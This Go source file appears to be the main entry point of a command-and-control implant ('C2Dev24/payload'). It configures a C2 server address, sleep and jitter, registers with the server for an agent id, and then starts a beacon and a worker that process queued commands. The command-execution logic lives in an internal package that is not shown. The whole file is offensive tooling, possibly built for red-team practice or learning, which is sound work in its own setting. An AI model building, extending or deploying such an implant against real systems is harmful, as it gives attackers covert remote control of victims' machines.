package main

import (
	"fmt"
	"github.com/coremedic/C2Dev24/payload/internal"
	"io"
	"log"
	"sync"
)

var (
	C2Host string = "http://127.0.0.1:8080"
	Sleep  int    = 10
	Jitter int    = 5
	err    error
)

// Instance
//
// Singleton for our payload instance
type Instance struct {
	C2Host   string
	Sleep    int
	Jitter   int
	HttpConn *internal.HttpConn
	Beacon   *internal.Beacon
}

var (
	once          sync.Once
	localInstance *Instance
)

// GetLocalInstance
//
// Fetch local singleton instance
func GetLocalInstance() *Instance {
	once.Do(func() {
		localInstance = &Instance{
			C2Host: C2Host,
			Sleep:  Sleep,
			Jitter: Jitter,
		}
	})
	return localInstance
}

func main() {
	// Fetch local singleton instance
	instance := GetLocalInstance()

	// Create our HttpConn instance
	instance.HttpConn, err = internal.NewHttpConn(instance.C2Host)
	if err != nil {
		log.Fatal(err)
	}

	// Create our Beacon instance
	instance.Beacon = internal.NewBeacon()

	// Configure Beacon instance
	instance.Beacon.Sleep = instance.Sleep
	instance.Beacon.Jitter = instance.Jitter
	instance.Beacon.HttpConn = instance.HttpConn
	instance.Beacon.ReqQueue = &internal.RequestQueue
	instance.Beacon.CmdQueue = &internal.CommandQueue

	// Fetch agent id from C2
	id, err := getId(instance)
	if err != nil {
		log.Fatal(err)
	}
	instance.HttpConn.Id = *id

	// Start the beacon
	instance.Beacon.Start()
	wrker := internal.Worker{
		Kill:     false,
		HttpConn: instance.HttpConn,
		ReqQueue: instance.Beacon.ReqQueue,
		CmdQueue: instance.Beacon.CmdQueue,
	}
	wrker.Run()
}

func getId(instance *Instance) (*string, error) {
	idReq, err := instance.HttpConn.NewIdRequest()
	if err != nil {
		return nil, err
	}

	resp, err := instance.HttpConn.SendRequest(idReq)
	if err != nil {
		return nil, err
	}

	if resp.Body == nil {
		return nil, fmt.Errorf("error getting id")
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	ret := string(body)
	return &ret, nil
}
